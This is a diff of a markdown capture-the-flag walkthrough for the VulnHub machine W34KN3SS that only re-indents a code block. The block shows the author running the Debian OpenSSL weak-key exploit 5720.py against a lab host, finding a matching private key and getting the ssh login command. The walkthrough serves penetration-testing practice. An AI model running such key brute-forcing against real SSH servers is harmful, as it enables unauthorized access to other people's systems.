@@ -214,28 +214,28 @@ PORT    STATE SERVICE  REASON         VERSION
 		...
 		```
 	4. Execute python script
-	```
-	┌──(root💀kali)-[~/vulnHub/W34KN3SS/192.168.236.9/exploit]
-	└─# python 5720.py 
-	-OpenSSL Debian exploit- by ||WarCat team|| warcat.no-ip.org
-	./exploit.py <dir> <host> <user> [[port] [threads]]
-		<dir>: Path to SSH privatekeys (ex. /home/john/keys) without final slash
-		<host>: The victim host
-		<user>: The user of the victim host
-		[port]: The SSH port of the victim host (default 22)
-		[threads]: Number of threads (default 4) Too big numer is bad
-	
-	┌──(root💀kali)-[~/vulnHub/W34KN3SS/192.168.236.9/exploit/openssl-0.9.8c-1]
-	└─# python 5720.py rsa/2048/ 192.168.236.9 n30 22 5
+		```
+		┌──(root💀kali)-[~/vulnHub/W34KN3SS/192.168.236.9/exploit]
+		└─# python 5720.py 
+		-OpenSSL Debian exploit- by ||WarCat team|| warcat.no-ip.org
+		./exploit.py <dir> <host> <user> [[port] [threads]]
+			<dir>: Path to SSH privatekeys (ex. /home/john/keys) without final slash
+			<host>: The victim host
+			<user>: The user of the victim host
+			[port]: The SSH port of the victim host (default 22)
+			[threads]: Number of threads (default 4) Too big numer is bad
 
-	-OpenSSL Debian exploit- by ||WarCat team|| warcat.no-ip.org
-	Tested 202 keys | Remaining 32566 keys | Aprox. Speed 40/sec
+		┌──(root💀kali)-[~/vulnHub/W34KN3SS/192.168.236.9/exploit/openssl-0.9.8c-1]
+		└─# python 5720.py rsa/2048/ 192.168.236.9 n30 22 5
 
-	Key Found in file: 4161de56829de2fe64b9055711f531c1-2537
-	Execute: ssh -ln30 -p22 -i rsa/2048//4161de56829de2fe64b9055711f531c1-2537 192.168.236.9
+		-OpenSSL Debian exploit- by ||WarCat team|| warcat.no-ip.org
+		Tested 202 keys | Remaining 32566 keys | Aprox. Speed 40/sec
 
-	Tested 280 keys | Remaining 32488 keys | Aprox. Speed 15/sec
-	```
+		Key Found in file: 4161de56829de2fe64b9055711f531c1-2537
+		Execute: ssh -ln30 -p22 -i rsa/2048//4161de56829de2fe64b9055711f531c1-2537 192.168.236.9
+
+		Tested 280 keys | Remaining 32488 keys | Aprox. Speed 15/sec
+		```
 	- Found key `4161de56829de2fe64b9055711f531c1-2537`
 	![](images/Pasted%20image%2020220124202456.png)
 ## TCP/22 - SSH 
